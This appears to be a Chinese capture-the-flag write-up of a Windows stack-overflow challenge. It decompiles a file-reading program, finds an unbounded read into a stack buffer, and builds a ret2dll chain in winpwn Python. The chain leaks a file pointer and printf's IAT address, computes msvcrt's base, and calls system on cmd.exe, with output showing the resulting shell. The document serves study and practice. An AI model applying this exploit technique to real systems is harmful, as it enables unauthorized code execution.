    #include 
    #include 
    int main(int argc, char** argv) {
        printf("hello wrold");
        system("pause");
        return 0;
    }
接着用[进程资源管理器](https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer)这个工具查看test.exe的dll有哪些
看到了几个经常看见的dll，`ntdll.dll`, `kernel32.dll`, `KernelBase.dll`, `ucrtbase.dll`
  * ntdll.dll：ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。是Windows系统从ring3到ring0的入口，位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中
  * kernel32.dll：kernel32.dll是非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域
  * KernelBase.dll：系统文件kernelbase.dll是存放在Windows系统文件夹中的重要文件，通常情况下是在安装操作系统过程中自动创建的，对于系统正常运行来说至关重要
  * ucrtbase.dll：在介绍ucrtbase.dll前先看一下msvcrt.dll是啥，msvcrt.dll是微软在windows操作系统中提供的C语言运行库执行文件（Microsoft Visual C Runtime Library)，其中提供了printf,malloc,strcpy等C语言库函数的具体运行实现，这个和libc.so很像。ucrtbase.dll其实就是把`msvcrt.dll`拆开了，主要的c运行时的代码放在了`ucrtbase.dll`中
整个调用链如上
现在回到题目，ida反汇编之后如下
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      FILE *v4; // [esp+1Ch] [ebp-4h]
      __main();
      if ( argc \n", *argv);
        exit(1);
      }
      v4 = fopen(argv[1], "r");
      manage_file(v4, (char *)argv[1]);
      return 0;
    }
会把argv转入的filename通过fopen打开，传入到`manage_file`函数中，跟进
    int __usercall manage_file@(int a1@, FILE *Stream, char *FileName)
    {
      void *v3; // esp
      int v4; // eax
      int v5; // eax
      int v6; // eax
      char DstBuf[8192]; // [esp+14h] [ebp-a] BYREF
      int FileHandle; // [esp+2014h] [ebp-14h]
      unsigned int MaxCharCount; // [esp+2018h] [ebp-10h]
      FILE *v11; // [esp+201Ch] [ebp-Ch]
      v3 = alloca(a1);
      memset(DstBuf, 0, sizeof(DstBuf));
      v11 = Stream;
      printf("File name: %s\n", FileName);
      fseek(Stream, 0, 2);
      MaxCharCount = ftell(Stream);
      rewind(Stream);
      printf("File size: %d\n", MaxCharCount);
      FileHandle = open(FileName, 0);
      read(FileHandle, DstBuf, MaxCharCount);
      close(FileHandle);
      v4 = count_chars(DstBuf);
      printf("Alphanumerical chars: %d\n", v4);
      v5 = count_words(DstBuf);
      printf("Words: %d\n", v5);
      v6 = count_lines(DstBuf);
      printf("Lines: %d\n", v6);
      printf("File pointer: %p\n", v11);
      return fclose(v11);
    }
首先会输出文件名，接着会把文件大小给输出，然后打开文件通过read将文件里面的内容输入到`DstBuf`这个变量中，值得注意的是并没有对大小进行限制，导致栈溢出的发生，但是还有一个点是需要注意的，fclose(v11)这个v11直接栈溢出的话会被覆盖掉最后会导致失败，所以需要把v11先给泄露出来然后栈溢出的时候把v11还给覆盖成正常的pointer即可
所以先随便写一个文件然后运行一下输出一下`File pointer`
    PS ch73> echo a > p1
    PS ch73> .\ch73.exe p1
    File name: p1
    File size: 8
    Alphanumerical chars: 1
    Words: 1
    Lines: 0
    File pointer: 75E2D660
拿到`pointer`之后就可以构造第二个payload了，因为这个程序没有system函数，但是我们需要getshell所以不得不寻找system，在glibc
pwn中，可以使用ret2libc的攻击手法，在win中通过上面的介绍`msvcrt.dll`里提供了具体的实现，所以也是有ret2dll的攻击方法，原理和ret2libc差不多
在win中并没有plt和got表这个概念，但是DLL也用到了类似GOT的方法，称为 **导入地址数组** （ **Import Address
Table，IAT**
），IAT和GOT非常类似，IAT中表项对应本模块中用到的外部符号的真实地址，初始为空（也不算为空），在装载后由动态链接器更新为真实地址。在ida中可以看到位于.idata段中
plt其实可以看成下图的地址
接下来构造第二个payload，也就是输出printf的真实地址，exp如下
    from winpwn import *
    context.log_level = 'debug'
    printf_plt = 0x402974
    printf_got = 0x406200
    p1 = p32(0x75E2D660) * 2053
    p1 += p32(0xdeadbeef)
    p1 += p32(printf_plt)
    p1 += p32(0x004016E3)
    p1 += p32(printf_got)
    p1 = [ord(i) for i in p1]
    with open('./p2', 'wb+') as f:
        f.write(bytes(p1))
    f.close()
运行之后最后那一串就是printf的真实地址，因为是argv这种参数，所以接收地址不是很好接收，winpwn自动化没有输出（很奇怪），所以笔者就用动态调试exp来获得printf的真实地址，这里笔者用的ida调试的
    PS ch73> .\ch73.exe p2
    File name: p2
    File size: 8228
    Alphanumerical chars: 2054
    Words: 1
    Lines: 0
    File pointer: 75E2D660
    pV觰PW觰痒觰 Y觰PY觰€[觰File name: 兡[?垭壝岰?卲*@
在`401825`这里下个断点然后，在debug里面选择本地，找到程序后Parameters里面放入p2也就是argv，然后开始调试
到断点那里，然后g搜索到`406200`这个地址，这个里面就存放的是printf的真实地址
拿到printf真实的地址之后就需要算dll的base，在笔者的虚拟机里`msvcrt.dll`是在`C:\Windows\SyChpe32\msvcrt.dll`但是笔者在实机上测的时候这个程序的dll在
`C:\WINDOWS\SysWOW64\msvcrt.dll`这里
把dll文件拖到ida中，搜索printf在dll里面的偏移算出dll_base，还有system以及cmd.exe的偏移并算出真实地址
    printf_addr = 0x75D35670
    dll_base = printf_addr - 0x10105670
    system_addr = dll_base + 0x10105A70
    cmd_addr = dll_base + 0x1010D158
最后再构造getshell的payload如下
    p1 = p32(0x75E2D660) * 2053
    p1 += p32(0xdeadbeef)
    p1 += p32(system_addr)
    p1 += p32(0x004016E3)
    p1 += p32(cmd_addr)
    p1 = [ord(i) for i in p1]
    with open('./p3', 'wb+') as f:
        f.write(bytes(p1))
    f.close()
运行即可getshell
    PS ch73> .\ch73.exe p3
    File name: p3
    File size: 8228
    Alphanumerical chars: 2056
    Words: 1
    Lines: 0
    File pointer: 75E2D660
    Microsoft Windows [版本 10.0.22000.1219]
    (c) Microsoft Corporation。保留所有权利。
## 总结
这里笔者学习了IAT表和作用，还有argv参数的调试，坑点是`msvcrt.dll`这个文件位置需要根着自己本机的程序来确定，笔者卡在这里一段时间，最后想了一下把程序在ida中调试了一下才发现`msvcrt.dll`的位置和网上的wp有些不一样
## Reference